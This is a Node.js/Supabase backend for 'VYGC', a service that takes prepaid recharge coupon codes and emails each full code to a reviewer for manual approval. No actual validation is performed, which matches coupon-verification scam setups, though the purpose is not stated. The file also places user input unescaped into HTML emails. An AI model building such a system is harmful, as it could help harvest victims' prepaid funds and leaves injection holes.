// ==========================================
// VYGC BACKEND - Node.js + Supabase
// ==========================================

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const { createClient } = require('@supabase/supabase-js');
const nodemailer = require('nodemailer');

// Initialize Express
const app = express();
const PORT = process.env.PORT || 3000;

// Initialize Supabase
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_ANON_KEY
);

const supabaseAdmin = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_ROLE_KEY
);

// Middleware
app.use(helmet());

// Configure CORS - support single URL or comma-separated list
const clientUrls = process.env.CLIENT_URL 
  ? process.env.CLIENT_URL.split(',').map(url => url.trim())
  : ['http://localhost:8000', 'http://localhost:8080'];

console.log('🔧 CORS configured for origins:', clientUrls);

app.use(cors({
  origin: clientUrls,
  credentials: true
}));
app.use(express.json());

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: 'Too many requests from this IP, please try again later.'
});
app.use('/api/', limiter);

// ==========================================
// DATABASE SCHEMA (Supabase SQL)
// ==========================================
/*
Run this in Supabase SQL Editor:

CREATE TABLE submissions (
  id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT TIMEZONE('utc', NOW()),
  recharge_type VARCHAR(50) NOT NULL,
  recharge_code TEXT NOT NULL,
  currency VARCHAR(10) NOT NULL,
  email VARCHAR(255) NOT NULL,
  status VARCHAR(20) DEFAULT 'pending',
  approval_token VARCHAR(255),
  reject_token VARCHAR(255),
  verified_at TIMESTAMP WITH TIME ZONE,
  ip_address INET,
  user_agent TEXT,
  metadata JSONB
);

CREATE INDEX idx_submissions_status ON submissions(status);
CREATE INDEX idx_submissions_created_at ON submissions(created_at DESC);
CREATE INDEX idx_submissions_email ON submissions(email);
CREATE INDEX idx_submissions_approval_token ON submissions(approval_token);
CREATE INDEX idx_submissions_reject_token ON submissions(reject_token);

ALTER TABLE submissions ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Public insert only" ON submissions
  FOR INSERT WITH CHECK (true);

CREATE POLICY "Service role full access" ON submissions
  FOR ALL USING (auth.jwt() ? true : false);
*/

// ==========================================
// EMAIL NOTIFICATIONS
// ==========================================

async function sendReviewerNotification(submission, approveLink, rejectLink) {
  if (!process.env.SMTP_USER || !process.env.SMTP_PASS) {
    console.log('📧 Email not configured. Would send to reviewer.');
    console.log('📧 Submission:', JSON.stringify(submission, null, 2));
    console.log('📧 Approve:', approveLink);
    console.log('📧 Reject:', rejectLink);
    return;
  }

  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: process.env.SMTP_PORT,
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
      }
    });

    const mailOptions = {
      from: process.env.SMTP_USER,
      to: process.env.REVIEWER_EMAIL || process.env.SMTP_USER,
      subject: `📋 NEW SUBMISSION - ${submission.recharge_type.toUpperCase()} - Action Required`,
      html: `
        <!DOCTYPE html>
        <html>
        <head>
          <style>
            body { font-family: Arial, sans-serif; background: #0a0a0f; color: #fff; padding: 20px; margin: 0; }
            .container { max-width: 600px; margin: 0 auto; background: rgba(255,255,255,0.05); border-radius: 12px; padding: 24px; border: 1px solid rgba(255,255,255,0.1); }
            .header { font-size: 1.5rem; font-weight: bold; color: #00d4ff; margin-bottom: 20px; text-align: center; }
            .section { background: rgba(255,255,255,0.03); border-radius: 8px; padding: 16px; margin: 16px 0; }
            .section-title { color: #888; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
            .field { display: flex; justify-content: space-between; margin: 8px 0; font-size: 1rem; }
            .label { color: #aaa; }
            .value { font-family: monospace; font-weight: bold; color: #00ffcc; }
            .actions { display: flex; gap: 12px; margin-top: 24px; }
            .btn { flex: 1; padding: 16px; border-radius: 8px; text-decoration: none; font-weight: bold; font-size: 1rem; text-align: center; transition: all 0.3s; }
            .btn-approve { background: linear-gradient(135deg, #00ff88, #00cc66); color: #000; }
            .btn-reject { background: linear-gradient(135deg, #ff4444, #cc0000); color: #fff; }
            .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,0,0,0.3); }
            .footer { text-align: center; margin-top: 24px; color: #666; font-size: 0.8rem; }
            .id-display { font-family: monospace; color: #666; font-size: 0.85rem; margin-top: 8px; }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="header">📋 New Coupon Submission</div>
            <div class="section">
              <div class="section-title">Submission Details</div>
              <div class="field"><span class="label">Type:</span><span class="value">${submission.recharge_type.toUpperCase()}</span></div>
              <div class="field"><span class="label">Code:</span><span class="value">${submission.recharge_code}</span></div>
              <div class="field"><span class="label">Currency:</span><span class="value">${submission.currency.toUpperCase()}</span></div>
              <div class="field"><span class="label">Client Email:</span><span class="value">${submission.email}</span></div>
              <div class="id-display">ID: ${submission.id}</div>
            </div>
            <div class="actions">
              <a href="${approveLink}" class="btn btn-approve">✅ APPROVE</a>
              <a href="${rejectLink}" class="btn btn-reject">❌ REJECT</a>
            </div>
            <div class="footer">
              <p>review this submission. Clicking a button will immediately update the status.</p>
              <p style="margin-top: 8px;">If buttons don't work, copy and paste the link into your browser.</p>
            </div>
          </div>
        </body>
        </html>
      `
    };

    const info = await transporter.sendMail(mailOptions);
    console.log('📧 Approval email sent to:', process.env.REVIEWER_EMAIL || process.env.SMTP_USER, 'Message ID:', info.messageId);
  } catch (error) {
    console.error('Email error:', error);
  }
}

async function sendApprovalConfirmationEmail(submission) {
  if (!process.env.SMTP_USER || !process.env.SMTP_PASS) {
    console.log('📧 Email not configured. Skipping confirmation email.');
    return;
  }

  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: process.env.SMTP_PORT,
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
      }
    });

    const mailOptions = {
      from: process.env.SMTP_USER,
      to: submission.email,
      subject: `✅ VYGC - Your Submission Has Been Approved!`,
      html: `
        <!DOCTYPE html>
        <html>
        <head>
          <style>
            body { font-family: Arial, sans-serif; background: #0a0a0f; color: #fff; padding: 20px; }
            .container { max-width: 600px; margin: 0 auto; background: rgba(255,255,255,0.05); border-radius: 12px; padding: 24px; border: 1px solid rgba(255,255,255,0.1); }
            .header { font-size: 1.5rem; font-weight: bold; color: #00ff88; margin-bottom: 20px; text-align: center; }
            .success-badge { display: inline-block; padding: 10px 20px; background: rgba(0, 255, 136, 0.2); color: #00ff88; border-radius: 20px; margin-bottom: 20px; font-weight: bold; }
            .field { margin: 12px 0; }
            .label { color: #888; font-size: 0.85rem; text-transform: uppercase; }
            .value { font-size: 1.1rem; margin-top: 4px; font-family: monospace; color: #00ffcc; font-weight: bold; }
            .code { color: #00ffcc; font-weight: bold; font-size: 1.2rem; }
            .footer { text-align: center; margin-top: 24px; color: #666; font-size: 0.8rem; }
            .button { display: inline-block; margin-top: 20px; padding: 12px 24px; background: linear-gradient(135deg, #00ff88, #00cc66); color: #000; text-decoration: none; border-radius: 8px; font-weight: bold; }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="header">✅ Submission Approved</div>
            <div style="text-align: center;">
              <div class="success-badge">✓ Your submission has been verified</div>
              <p style="font-size: 1.1rem; margin-top: 16px;">Your coupon has been successfully validated.</p>
            </div>
            <div class="field" style="margin-top: 24px;">
              <div class="label">Recharge Type</div>
              <div class="value" style="color: #b044ff; font-weight: bold;">${submission.recharge_type.toUpperCase()}</div>
            </div>
            <div class="field">
              <div class="label">Code</div>
              <div class="value code">${submission.recharge_code}</div>
            </div>
            <div class="field">
              <div class="label">Currency</div>
              <div class="value">${submission.currency.toUpperCase()}</div>
            </div>
            <div class="field">
              <div class="label">Verified At</div>
              <div class="value">${new Date(submission.verified_at).toLocaleString()}</div>
            </div>
            <p class="footer">
              Thank you for using VYGC verification service.<br>
              If you have any questions, contact us.
            </p>
          </div>
        </body>
        </html>
      `
    };

    const info = await transporter.sendMail(mailOptions);
    console.log('📧 Confirmation email sent to:', submission.email, 'Message ID:', info.messageId);
  } catch (error) {
    console.error('Email error:', error);
  }
}

async function sendRejectionNotificationEmail(submission) {
  if (!process.env.SMTP_USER || !process.env.SMTP_PASS) {
    console.log('📧 Email not configured. Skipping rejection notification.');
    return;
  }

  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: process.env.SMTP_PORT,
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
      }
    });

    const mailOptions = {
      from: process.env.SMTP_USER,
      to: submission.email,
      subject: `⚠️ VYGC - Submission Review Update`,
      html: `
        <!DOCTYPE html>
        <html>
        <head>
          <style>
            body { font-family: Arial, sans-serif; background: #0a0a0f; color: #fff; padding: 20px; }
            .container { max-width: 600px; margin: 0 auto; background: rgba(255,255,255,0.05); border-radius: 12px; padding: 24px; border: 1px solid rgba(255,255,255,0.1); }
            .header { font-size: 1.5rem; font-weight: bold; color: #ff4444; margin-bottom: 20px; text-align: center; }
            .field { margin: 12px 0; }
            .label { color: #888; font-size: 0.85rem; text-transform: uppercase; }
            .value { font-size: 1.1rem; margin-top: 4px; font-family: monospace; color: #ff6b6b; font-weight: bold; }
            .footer { text-align: center; margin-top: 24px; color: #666; font-size: 0.8rem; }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="header">⚠️ Submission Status Update</div>
            <p style="text-align: center; font-size: 1.1rem; margin-top: 16px;">
              After review, your submission could not be approved at this time.
            </p>
            <div class="field" style="margin-top: 24px;">
              <div class="label">Recharge Type</div>
              <div class="value">${submission.recharge_type.toUpperCase()}</div>
            </div>
            <div class="field">
              <div class="label">Code</div>
              <div class="value">${submission.recharge_code}</div>
            </div>
            <div class="field">
              <div class="label">Currency</div>
              <div class="value">${submission.currency.toUpperCase()}</div>
            </div>
            <p class="footer">
              If you believe this is an error, please contact support.<br>
              Thank you for using VYGC.
            </p>
          </div>
        </body>
        </html>
      `
    };

    const info = await transporter.sendMail(mailOptions);
    console.log('📧 Rejection notification sent to:', submission.email, 'Message ID:', info.messageId);
  } catch (error) {
    console.error('Email error:', error);
  }
}

// ==========================================
// SUBMISSIONS ROUTES
// ==========================================

app.post('/api/submissions', async (req, res) => {
  try {
    const { rechargeType, rechargeCode, currency, email } = req.body;

    if (!rechargeType || !rechargeCode || !currency || !email) {
      return res.status(400).json({
        error: 'Missing required fields: rechargeType, rechargeCode, currency, email'
      });
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return res.status(400).json({ error: 'Invalid email format' });
    }

    const crypto = require('crypto');
    const approvalToken = 'APPROVE_' + crypto.randomBytes(24).toString('hex');
    const rejectToken = 'REJECT_' + crypto.randomBytes(24).toString('hex');

    const getBaseUrl = () => {
      if (process.env.CLIENT_URL) {
        // Use first URL if multiple are provided
        const firstUrl = process.env.CLIENT_URL.split(',')[0].trim();
        const url = new URL(firstUrl);
        return `${url.protocol}//${url.host}`;
      }
      const reqHost = req.get('host');
      const protocol = req.secure ? 'https' : 'http';
      return `${protocol}://${reqHost}`;
    };

    const baseUrl = getBaseUrl();
    const approveLink = `${baseUrl}/api/approve/${approvalToken}`;
    const rejectLink = `${baseUrl}/api/reject/${rejectToken}`;

    const ipAddress = req.ip || req.connection.remoteAddress || '127.0.0.1';

    const { data, error } = await supabaseAdmin
      .from('submissions')
      .insert({
        recharge_type: rechargeType,
        recharge_code: rechargeCode,
        currency: currency,
        email: email,
        status: 'pending',
        approval_token: approvalToken,
        reject_token: rejectToken,
        ip_address: ipAddress,
        user_agent: req.get('User-Agent'),
        metadata: {
          createdAt: new Date().toISOString(),
          source: 'client_form'
        }
      })
      .select()
      .single();

    if (error) {
      console.error('Database error:', error);
      return res.status(500).json({ error: 'Failed to save submission' });
    }

    sendReviewerNotification(data, approveLink, rejectLink).catch(console.error);

    res.status(201).json({
      success: true,
      message: 'Submission received. You will receive a confirmation email once verified.',
      id: data.id,
      status: 'pending'
    });

  } catch (error) {
    console.error('Submission error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Approve submission
app.get('/api/approve/:token', async (req, res) => {
  try {
    const { token } = req.params;

    const { data: submission, error } = await supabaseAdmin
      .from('submissions')
      .select('*')
      .eq('approval_token', token)
      .eq('status', 'pending')
      .single();

    if (error || !submission) {
      return res.status(400).json({ error: 'Invalid or expired approval link. This submission may have already been processed.' });
    }

    const { data: updated, error: updateError } = await supabaseAdmin
      .from('submissions')
      .update({
        status: 'approved',
        verified_at: new Date().toISOString(),
        approval_token: null,
        reject_token: null
      })
      .eq('id', submission.id)
      .select()
      .single();

    if (updateError) {
      console.error('Update error:', updateError);
      return res.status(500).json({ error: 'Failed to approve submission.' });
    }

    sendApprovalConfirmationEmail(updated).catch(console.error);

    res.json({
      success: true,
      message: 'Submission approved successfully! The client will receive a confirmation email.',
      submission: updated
    });

  } catch (error) {
    console.error('Approval error:', error);
    res.status(500).json({ error: 'Server error occurred.' });
  }
});

// Reject submission
app.get('/api/reject/:token', async (req, res) => {
  try {
    const { token } = req.params;

    const { data: submission, error } = await supabaseAdmin
      .from('submissions')
      .select('*')
      .eq('reject_token', token)
      .eq('status', 'pending')
      .single();

    if (error || !submission) {
      return res.status(400).json({ error: 'Invalid or expired rejection link. This submission may have already been processed.' });
    }

    const { error: updateError } = await supabaseAdmin
      .from('submissions')
      .update({
        status: 'rejected',
        verified_at: new Date().toISOString(),
        approval_token: null,
        reject_token: null
      })
      .eq('id', submission.id);

    if (updateError) {
      console.error('Update error:', updateError);
      return res.status(500).json({ error: 'Failed to reject submission.' });
    }

    sendRejectionNotificationEmail(submission).catch(console.error);

    res.json({
      success: true,
      message: 'Submission rejected. The client will be notified.'
    });

  } catch (error) {
    console.error('Rejection error:', error);
    res.status(500).json({ error: 'Server error occurred.' });
  }
});

// ==========================================
// HEALTH CHECK
// ==========================================

app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// ==========================================
// ERROR HANDLING
// ==========================================

app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

app.use('*', (req, res) => {
  res.status(404).json({ error: 'Route not found' });
});

// ==========================================
// START SERVER
// ==========================================

async function startServer() {
  try {
    const { error } = await supabaseAdmin.from('submissions').select('count');
    if (error) {
      console.error('❌ Supabase connection failed:', error.message);
      console.log('💡 Make sure you ran the SQL schema in Supabase SQL Editor');
    } else {
      console.log('✅ Connected to Supabase successfully');
    }

    app.listen(PORT, () => {
      console.log(`\n🚀 VYGC Backend Server running on port ${PORT}`);
      console.log(`📡 API: http://localhost:${PORT}/api`);
      console.log(`📧 Email verification enabled`);
      console.log(`\n💡 Don't forget to:`);
      console.log(`   1. Setup Supabase tables (see comments in server.js)`);
      console.log(`   2. Update .env with your Supabase keys and SMTP credentials`);
      console.log(`   3. Set CLIENT_URL to your frontend URL\n`);
    });
  } catch (error) {
    console.error('Failed to start server:', error);
    process.exit(1);
  }
}

startServer();
